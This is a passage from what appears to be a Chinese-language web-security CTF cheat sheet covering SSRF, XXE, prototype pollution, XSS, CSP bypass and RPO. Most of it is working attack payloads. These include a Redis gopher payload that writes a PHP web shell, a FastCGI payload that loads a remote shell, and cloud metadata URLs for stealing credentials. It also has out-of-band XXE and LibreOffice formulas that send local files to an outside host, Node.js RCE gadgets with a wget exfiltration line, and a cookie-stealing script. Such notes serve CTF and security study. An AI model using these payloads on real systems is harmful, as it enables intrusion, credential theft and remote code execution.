<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

- FFMPEG
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://yourserver.com/anything
#EXT-X-ENDLIST
```

## Bypass 127.0.0.1 

```
127.0.0.1
127.00000.00000.0001
localhost
127.0.1
127.1
0.0.0.0
0.0
0

::1
::127.0.0.1
::ffff:127.0.0.1
::1%1

127.12.34.56 (127.0.0.1/8)
127.0.0.1.xip.io

http://2130706433 (decimal)
http://0x7f000001
http://017700000001
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://0177.01.01.01
http://0x7f.1
http://[::]
```

## Bypass using Ⓐ Ⓑ Ⓒ Ⓓ

- `http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ`
- `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`

## 內網IP

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

## XSPA

- port scan
    - `127.0.0.1:80` => OK
    - `127.0.0.1:87` => Timeout
    - `127.0.0.1:9487` => Timeout

## 302 Redirect Bypass

- 用來繞過 protocol 限制
- 第一次 SSRF，網站有做檢查、過濾
- 302 跳轉做第二次 SSRF 沒有檢查

## 本地利用

- file protocol
    - `file:///etc/passwd`
    - `file:///proc/self/cmdline`
        - 看他在跑啥
    - `file:///proc/self/exe`
        - dump binary
    - `file:///proc/self/environ`
        - 讀環境變數
    - `curl file://google.com/etc/passwd`
        - 新版已修掉
        - 實測 libcurl 7.47 可work
    - Java 原生可列目錄 (`netdoc` 亦可)
    - Perl/Ruby open Command Injection

- Libreoffice CVE-2018-6871
    - 可以使用 `WEBSERVICE` 讀本地檔案，e.g.`/etc/passwd`
    - 讀出來可以用 http 往外傳
        - `=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`
        - e.g. DCTF 2018 final, [FBCTF 2019](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/README_en.md)
    - Example Payload: [Link](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)

## 遠程利用
- Gopher
    - 可偽造任意 TCP，hen 蚌
    - `gopher://127.0.0.1:5278/xGG%0d%0aININDER`
- 常見例子
    - Struts2
        - S2-016
            - `action:`、`redirect:`、`redirectAction:`
            - `index.do?redirect:${new java.lang.ProcessBuilder('id').start()}`
    - ElasticSearch
        - default port: `9200`
    - Redis
        - default port: `6379`
        - 用 SAVE 寫 shell
        ```
            FLUSHALL 
            SET myshell "<?php system($_GET['cmd']) ?>"
            CONFIG SET DIR /www 
            CONFIG SET DBFILENAME shell.php 
            SAVE
            QUIT
        ```
        - URLencoded payload:
        `gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
    - FastCGI
        - default port: 9000
        - example
            - Discuz Pwn
                - 302.php: `<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
                - x: `<?php system($_GET['cmd']); ?>`
                - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]`
    - MySQL
        - 無密碼認證可以 SSRF
        - MySQL Client 與 Server 交互主要分兩階段
            - Connection Phase
            - Command Phase
        - `gopher://127.0.0.1:3306/_<PAYLOAD>`
        - Tool: https://github.com/undefinedd/extract0r-
    - MSSQL
        - Example
            - [35c3 - post](https://ctftime.org/writeup/12808)
            - [N1CTF 2021 - Funny_web](https://harold.kim/blog/2021/11/n1ctf-writeup/)
        - Tool: https://github.com/hack2fun/gopher_attack_mssql
    - Tomcat
        - 透過 tomcat manager 部署 war
        - 要先有帳密，可以從 `tomcat-users.xml` 讀，或是踹預設密碼
        - Tool: https://github.com/pimps/gopher-tomcat-deployer
        - e.g. [CTFZone 2019 qual - Catcontrol](https://github.com/w181496/CTF/tree/master/CTFZone-2019-qual/Catcontrol)

    - Docker 
        - Remote api 未授權訪問
            - 開一個 container，掛載 /root/，寫 ssh key
            - 寫 crontab彈 shell
            - `docker -H tcp://ip xxxx`

    - ImageMagick - CVE-2016-3718
        - 可以發送 HTTP 或 FTP request
        - payload: ssrf.mvg
        ```
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(http://example.com/)'
        pop graphic-context
        ```
        - `$ convert ssrf.mvg out.png`
   
## Metadata

### AWS

- http://169.254.169.254/latest/user-data
- http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
- http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
- http://169.254.169.254/latest/meta-data/ami-id
- http://169.254.169.254/latest/meta-data/reservation-id
- http://169.254.169.254/latest/meta-data/hostname
- http://169.254.169.254/latest/meta-data/public-keys/
- http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
- http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

### Google Cloud

- http://metadata.google.internal/computeMetadata/v1/
- http://metadata.google.internal/computeMetadata/v1beta1/
    - 請求不用加上 header
- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
    - Access Token
    - Check the scope of access token: `curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=XXXXXXXXXXXXXXXXXXX"`
    - Call the Google api with token: `curl "https://www.googleapis.com/storage/v1/b?project=<your_project_id>" -H "Authorization: Bearer ya29..."` (list buckets)
- http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
    - SSH public key
- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
    - kub-env
- http://metadata.google.internal/computeMetadata/v1beta1/project/project-id
- http://metadata.google.internal/computeMetadata/v1beta1/instance/name
- http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname
- http://metadata.google.internal/computeMetadata/v1beta1/instance/zone


### Digital Ocean

- http://169.254.169.254/metadata/v1.json
- http://169.254.169.254/metadata/v1/ 
- http://169.254.169.254/metadata/v1/id
- http://169.254.169.254/metadata/v1/user-data
- http://169.254.169.254/metadata/v1/hostname
- http://169.254.169.254/metadata/v1/region
- http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

### Azure

- http://169.254.169.254/metadata/v1/maintenance
- http://169.254.169.254/metadata/instance?api-version=2020-06-01
    - 需要加上 `Metadata: true` header

### Alibaba

- http://100.100.100.200/latest/meta-data/
- http://100.100.100.200/latest/meta-data/instance-id
- http://100.100.100.200/latest/meta-data/image-id

## CRLF injection

### SMTP

SECCON 2017 SqlSRF:

`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`

## FingerPrint

- dict
```
dict://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5566 [tcp/*] accepted (family 2, sport 40790)
CLIENT libcurl 7.35.0

-> libcurl version
```
- sftp
```
sftp://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)
SSH-2.0-libssh2_1.4.2

-> ssh version
```

- Content-Length
    - 送超大 Content-length
    - 連線 hang 住判斷是否為 HTTP Service

## UDP

- tftp
    - `tftp://evil.com:5566/TEST`
    - syslog

---

SSRF Bible:

https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

Testing Payload:

https://github.com/cujanovic/SSRF-Testing


# XXE

## 內部實體

```xml
<!DOCTYPE kaibro[
    <!ENTITY param "hello">
]>
<root>&param;</root>
```

## 外部實體

- `libxml2.9.0` 以後，預設不解析外部實體
- `simplexml_load_file()` 舊版本中預設解析實體，但新版要指定第三個參數 `LIBXML_NOENT`
- `SimpleXMLElement` is a class in PHP
    - http://php.net/manual/en/class.simplexmlelement.php

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "http://kaibro.tw/xxe.txt">
]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### XXE on Windows

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "\\12.34.56.78">
]>
<root>&xxe;</root>
```

## 參數實體

```xml
<!DOCTYPE kaibro[
    <!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
    %remote;
]>
<root>&b;</root>
```
xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`


## Out of Band (OOB) XXE

- Blind 無回顯

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php">
<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```

xxe.dtd:

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>">
```

## CDATA

把特殊字元塞進 CDATA 解決無法讀取問題

```xml
<!DOCTYPE data [
 <!ENTITY % dtd SYSTEM "http://kaibro.tw/cdata.dtd">
     %dtd;
     %all;
 ]>
<root>&f;</root>
```

cdata.dtd:

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/flag.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
```

## DoS

- Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## 串Phar反序列化

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ 
    <!ENTITY xxe SYSTEM "phar:///var/www/html/images/gginin/xxxx.jpeg" > ]>
    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
</svg>
```

- Example: [MidnightSun CTF - Rubenscube](https://github.com/w181496/CTF/tree/master/midnightsun2019/Rubenscube)

## Error-based XXE

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
```

- Example: [Google CTF 2019 Qual - bnv](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)

## Java XXE + FTP

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8080/ftp.dtd">
        %dtd;%ftp;%send;
        ]>
<ANY>xxe</ANY>
```

ftp.dtd:

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'>">
```

or

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:pass@127.0.0.1:2121/%file;'>">
```

正常 OOB XXE 遇到檔案內容有 `\n` 會爛

但 Java 環境下，部分版本透過 FTP 不會被影響:
- `<7u141-b00` or `<8u131-b09`: 不受檔案中 `\n` 的影響
- `>jdk8u131`: 能建立 FTP 連線，外帶檔案內容中含 `\n` 則拋出異常
- `>jdk8u232`: 不能建立 FTP 連線，若 url 中含有 `\n` 則抛出異常

## SOAP

```xml
<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://kaibro.tw:22/"> %dtd;]><xxx/>]]>
</foo>
</soap:Body>
```

## XInclude

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://kaibro.tw/file.xml"></xi:include>
</root>
```

## XSLT

Read local file:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

## 其它

- Document XXE
    - DOCX
    - XLSX
    - PPTX
    - PDF
    - https://github.com/BuffaloWill/oxml_xxe

# Prototype Pollution

```javascript
goodshit = {}
goodshit.__proto__.password = "ggininder"

user = {}
console.log(user.password)
# => ggininder
```

```javascript
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)
# => 1 2

o3 = {}
console.log(o3.b)
# => 2
```

## jQuery

- CVE-2019-11358
    - jQuery < 3.4.0
    - `$.extend`

    ```javascript
    let a = $.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
    console.log({}.devMode); // true
    ```

## Lodash

- SNYK-JS-LODASH-608086
    - versions < 4.17.17
    - 觸發點: `setWith()`, `set()`
    - Payload:
        - `setWith({}, "__proto__[test]", "123")`
        - `set({}, "__proto__[test2]", "456")`
- CVE-2020-8203
    - versions < 4.17.16
    - 觸發點: `zipObjectDeep()`
    - Payload: `zipObjectDeep(['__proto__.z'],[123])`
        - `console.log(z)` => 123
- CVE-2019-10744
    - versions < 4.17.12
    - 觸發點: `defaultsDeep()`
    - Payload: `{"type":"test","content":{"prototype":{"constructor":{"a":"b"}}}}`
    - Example: 
        - [XNUCA 2019 Qualifier - HardJS](https://www.anquanke.com/post/id/185377)
        - [RedPwn CTF 2019 - Blueprint](https://ctftime.org/writeup/16201)
- CVE-2018-16487 / CVE-2018-3721
    - versions < 4.17.11
    - 觸發點: `merge()`, `mergeWith()`, `defaultsDeep()`

    ```javascript
    var _= require('lodash');
    var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
    var a = {};
    _.merge({}, JSON.parse(malicious_payload));
    ```

## Process Spawning

- 如果可以污染環境變數+Process spawning，將有機會RCE

```javascript
const { exec, execSync, spawn, spawnSync, fork } = require('child_process');

// pollute
Object.prototype.env = {
	NODE_DEBUG : 'require("child_process").execSync("touch pwned")//',
	NODE_OPTIONS : '-r /proc/self/environ'
};

// method 1
fork('blank');
// method 2
spawn('node', ['blank']).stdout.pipe(process.stdout);
// method 3
console.log(spawnSync('node', ['blank']).stdout.toString());
// method 4
console.log(execSync('node  blank').toString());
```

```javascript
({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';
console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
```

```javascript
({}).__proto__.NODE_OPTIONS = `--experimental-loader="data:text/javascript,console.log('injection');"`;
console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
```


- 如果可以蓋 `Object.prototype.shell`，則 spawn 任意指令都可 RCE

```javascript
const child_process = require('child_process');

Object.prototype.shell = 'node';
Object.prototype.env = {
   NODE_DEBUG : '1; throw require("child_process").execSync("touch pwned").toString()//',
   NODE_OPTIONS : '-r /proc/self/environ'
};

child_process.execSync('id');
```

- 補充：蓋環境變數的各種玩法 (https://blog.p6.is/Abusing-Environment-Variables/)

- Example
    - [ACSC 2021 Qual - Cowsay as a Service](https://github.com/w181496/CTF/tree/master/ACSC2021_qual/cowsay)

## require

- 低版本 gadget
    - 實測 Node 15.x, 16.x, 17.x 都有機會 work
```javascript
a = {} 
a["__proto__"]["exports"] = {".":"./pwn.js"} 
a["__proto__"]["1"] = "./" 
require("./index.js")
```

- 高版本 gadget
    - 控制 trySelf 的 data, path 參數可以任意 LFI
        - 引入環境中的 preinstall.js 或 yarn.js 等檔案可 RCE
    - v18.8.0 works
    ```json
    {
       "__proto__":{
          "data":{
             "name":"./usage",
             "exports":"./preinstall.js"
          },
          "path":"/opt/yarn-v1.22.19/",
          "shell":"sh",
          "contextExtensions":[
             {
                "process":{
                   "env":{
                      "npm_config_global":"1",
                      "npm_execpath":""
                   },
                   "execPath":"wget\u0020http://1.3.3.7/?p=$(/readflag);echo"
                }
             }
          ],
       }
    }
    ```

- Example
    - [Balsn CTF 2022 - 2linenodejs](https://gist.github.com/ginoah/e723a1babffae01ffa5149121776648c)

## Misc

- https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/msrkp/PPScan
- EJS RCE
    - `outputFunctionName`
    - 直接拼接到模板執行
    - 污染即可 RCE: `Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').exec('touch pwned');x";`
    - 補充: 不需要 Prototype Pollution 的 RCE (ejs render 誤用)
        - 漏洞成因: `res.render('index.ejs', req.body);`
        - `req.body` 會污染到 `options` 進而污染到 `outputFunctionName` (HPP)
        - Example: [AIS3 EOF 2019 Quals - echo](https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo)

# Frontend

## XSS

### Cheat Sheet

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://tinyxss.terjanq.me/
    - Tiny XSS Payload

### Basic Payload

- `<script>alert(1)</script>`
- `<svg/onload=alert(1)>`
- `<img src=# onerror=alert(1)>`
- `<a href="javascript:alert(1)">g</a>`
- `<input type="text" value="g" onmouseover="alert(1)" />`
- `<iframe src="javascript:alert(1)"></iframe>`
- ...

### Testing

- `<script>alert(1)</script>`
- `'"><script>alert(1)</script>`
- `<img/src=@ onerror=alert(1)/>`
- `'"><img/src=@ onerror=alert(1)/>`
- `' onmouseover=alert(1) x='`
- `" onmouseover=alert(1) x="`
- ``` `onmouseover=alert(1) x=` ```
- `javascript:alert(1)//`
- ....

### 繞過

- `//`(javascript 註解) 被過濾時，可以利用算數運算符代替
    - `<a href="javascript:alert(1)-abcde">xss</a>`
- HTML 特性
    - 不分大小寫
        - `<ScRipT>`
        - `<img SrC=#>`
    - 屬性值
        - `src="#"`
        - `src='#'`
        - `src=#`
        - ```src=`#` ``` (IE)
- 編碼繞過
    - `<svg/onload=alert(1)>`
        - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16進位) (分號可去掉)
- 繞空白
    - `<img/src='1'/onerror=alert(0)>`
- 繞限制字元
    - `<script>onerror=alert;throw 1</script>`
    - `<script>{onerror=alert}throw 1</script>`
    - `<script>throw onerror=alert,1</script>`
    - `<script>throw[onerror]=[alert],1</script>`
    - `<script>var{a:onerror}={a:alert};throw 1</script>`
    - `<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>`
    - `<script>new Function`X${document.location.hash.substr`1`}`</script>`
## 其他

- 特殊標籤
    - 以下標籤中的腳本無法執行
    - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...
- innerHTML
    - `<script>` 不會被 trigger
    - 其他標籤可，例如: `<img src=@ onerror=alert()>`
    - double `<svg>` trick 
        - `<svg><svg onload=alert()>`
        - 透過 innerHTML 插入時，會立即被觸發
        - Example
            - [Dice CTF 2022 - no-cookies](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/)
            - [HITCON CTF 2022 - Self Destruct Message](https://blog.splitline.tw/hitcon-ctf-2022/)
            - [一次对 Tui Editor XSS 的挖掘与分析](https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html)
- Protocol
    - javascript:
        - `<a href=javascript:alert(1) >xss</a>`
        - `<iframe src="javascript:alert(1)">`
        - with new line: `<a href="javascript://%0aalert(1)">XSS</a>`
        - assignable protocol with location: `<script>location.protocol='javascript'</script>`
            - Example: [portswigger cheatsheet](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C/script%3E#%0aalert(1)//&context=html)
    - data:
        - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`
- Javascript 自解碼機制
    - `<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />`
    - 會成功 `alert(1)`，因為 javascript 位於 HTML 中，在執行 javascript 前會先解碼 HTML 編碼
    - 但若是包在 `<script>` 中的 javascript，不會解碼 HTML 編碼
    - 此編碼為 HTML entity 和 `&#xH;`(hex), `&#D;`(dec) 形式

- Javascript 中有三套編碼/解碼函數
    - escape/unescape
    - encodeURI/decodeURI
    - encodeURIComponent/decodeURICompinent

- 一些 `alert(document.domain)` 的方法
    - `(alert)(document.domain);`
    - `al\u0065rt(document.domain);`
    - `al\u{65}rt(document.domain);`
    - `[document.domain].map(alert);`
    - `window['alert'](document.domain);`
    - `alert.call(null,document.domain);`
    - `alert.bind()(document.domain);`
    - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309

- Some Payload
    - `<svg/onload=alert(1);alert(2)>`
    - `<svg/onload="alert(1);alert(2)">`
    - `<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">`
        - `;;` 改成 `;` 會失敗
        - 雙引號可去掉
        - 可10進位, 16進位混合
    - `<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>`
        - `\u` 形式只能用在 javascript，例如 `onload` 的 `a` 改成 `\u0061` 會失敗
    - `<title><a href="</title><svg/onload=alert(1)>`
        - title 優先權較大，直接中斷其他標籤
    - `<svg><script>prompt&#40;1)</script>`
        - 因為 `<svg>`，HTML Entities 會被解析
        - 去掉 `<svg>` 會失敗，`<script>`不會解析Entities
    - `<? foo="><script>alert(1)</script>">`
    - `<! foo="><script>alert(1)</script>">`
    - `</ foo="><script>alert(1)</script>">`
    - `<% foo="><script>alert(1)</script>">`

- Markdown XSS
    - `[a](javascript:prompt(document.cookie))`
    - `[a](j a v a s c r i p t:prompt(document.cookie))`
    - `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
    - `[a](javascript:window.onerror=alert;throw%201)`
    - ...

- SVG XSS

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

- iframe srcdoc XSS

```html
<iframe srcdoc="&#x3C;svg/&#x6f;nload=alert(document.domain)&#x3E;">
```

- Polyglot XSS
    - Example: PlaidCTF 2018 wave XSS
    - 上傳 `.wave` 檔 (會檢查 signatures)
      ```
        RIFF`....WAVE...` 
        alert(1); 
        function RIFF(){}
      ```
        - 變成合法的 js 語法
        - wave在apache mime type 中沒有被定義
        - `<script src="uploads/this_file.wave">`
- Text fragment
    - `:~:text=xxx`
    - [New feature in Chrome 80](https://developer.chrome.com/blog/new-in-chrome-80/#more)
    - Chrome will scroll to and highlight the first instance of that text fragment
    - Example
        - [Plaid CTF 2020 - Catalog](https://dttw.tech/posts/B19RXWzYL)

### CSP evaluator

https://csp-evaluator.withgoogle.com/

### Bypass CSP

- base
    - 改變資源載入的域，引入惡意的 js
    - `<base href ="http://kaibro.tw/">`
    - RCTF 2018 - rBlog

- script nonce
    
    ```
     <p>可控內容<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

    插入`<script src="http//kaibro.tw/uccu.js" a="`

    ```
     <p><script src="http//kaibro.tw/uccu.js" a="<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

- Script Gadget
    - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
    - is an **existing** JS code on the page that may be used to bypass mitigations
    - Bypassing CSP strict-dynamic via Bootstrap
        - `<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>`
    - Bypassing sanitizers via jQuery Mobile
        - `<div data-role=popup id='--><script>alert(1)</script>'></div>`
    - Bypassing NoScript via Closure (DOM clobbering)
        - `<a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>`
    - Bypassing ModSecurity CRS via Dojo Toolkit
        - `<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">`
    - Bypassing CSP unsafe-eval via underscore templates
        - `<div type=underscore/template> <% alert(1) %> </div>`
    - 0CTF 2018 - h4xors.club2
- google analytics ea
    - ea is used to log actions and can contain arbitrary string
    - Google CTF 2018 - gcalc2
- known jsonp endpoint
    - Google:
        - `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)`
        - `https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1`
    - [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
- PHP Warnings
    - In PHP, when you return any body data before `header()` is called, the call will be ignored because the response was already sent to the user and headers must be sent first.
    - Parameters Limit
        - `$_GET` / `$_POST`: maximum 1000 parameters
        - A request containing more than 1000 GET parameters, a warning will be sent, and the CSP header won't
    - Buffering
        - PHP is known for buffering the response to 4096 bytes by default
    - ref: 
        - [pilvar's challenge](https://twitter.com/pilvar222/status/1784618120902005070)
        - [justCTF 2020 - BabyCSP](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)
- DNS prefetch
    - `<link rel="dns-prefetch" href="https://data.example.com">`
- WebRTC
    - 嚴格 CSP，可以透過該方法將資料外傳
        - 例如: `default-src 'none'; script-src 'unsafe-inline';`
    - [WebRTC bypass CSP connect-src policies](https://github.com/w3c/webrtc-nv-use-cases/issues/35)
    ```javascript
    async function a(){
        c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
        (p=new RTCPeerConnection(c)).createDataChannel("d")
        await p.setLocalDescription()
    }
    a();
    ```
    - Example
        - [SeikaiCTF 2023 - Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
        - [corCTF 2023 - crabspace](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#crabspace-4-solves)
- Tool
    - https://cspbypass.com/

### Upload XSS

- htm
- html
- svg
- xml
- xsl
- rdf
    - firefox only?
    - `text/rdf` / `application/rdf+xml`
- vtt
    - IE/Edge only?
    - `text/vtt`
- shtml
- xhtml
- mht / mhtml
- var
    - [HITCON CTF 2020 - oStyle](https://github.com/orangetw/My-CTF-Web-Challenges#oStyle)
    - 預設安裝 Apache 包含 mod_negotiation 模組，可以設置 Response 中的 `Content-*` 屬性
    
```
Content-language: en
Content-type: text/html
Body:----foo----

<script>
fetch('http://orange.tw/?' + escape(document.cookie))
</script>

----foo----    
```

### Content-type

- XSS
    - https://github.com/BlackFan/content-type-research/blob/master/XSS.md
    - text/html	
    - application/xhtml+xml
    - application/xml
    - text/xml
    - image/svg+xml
    - text/xsl
    - application/vnd.wap.xhtml+xml
    - multipart/x-mixed-replace
    - text/rdf
    - application/rdf+xml
    - application/mathml+xml
    - text/vtt
    - text/cache-manifest

### jQuery

- `$.getJSON` / `$.ajax` XSS
    - 當 URL 長得像 `http://kaibro.tw/x.php?callback=anything` 
    - 會自動判斷成 jsonp callback，然後以 javascript 執行
    - Example: [VolgaCTF 2020 Qualifier - User Center](https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html)

### Online Encoding / Decoding
- http://monyer.com/demo/monyerjs/

### JSFuck
- http://www.jsfuck.com/

### aaencode / aadecode
- http://utf-8.jp/public/aaencode.html
- https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html


## RPO

- http://example.com/a%2findex.php
    - 瀏覽器會把 `a%2findex.php` 當成一個檔案
    - Web Server 則會正常解析成 `a/index.php`
    - 所以當使用**相對路徑**載入 css 時，就可以透過這種方式讓瀏覽器解析到其他層目錄下的檔案
        - 如果該檔案內容可控，則有機會 XSS
    - 舉例： 
        - `/test.php` 中有 `<link href="1/" ...>`
        - 另有 `/1/index.php` 給 `?query=` 參數，會直接輸出該參數內容
        - 訪問 `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php` 就會讓背景變紅色
            - Server: `/test.php`
            - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                - CSS 會載入`/1/?query={}*{background-color:red}/../../1/`
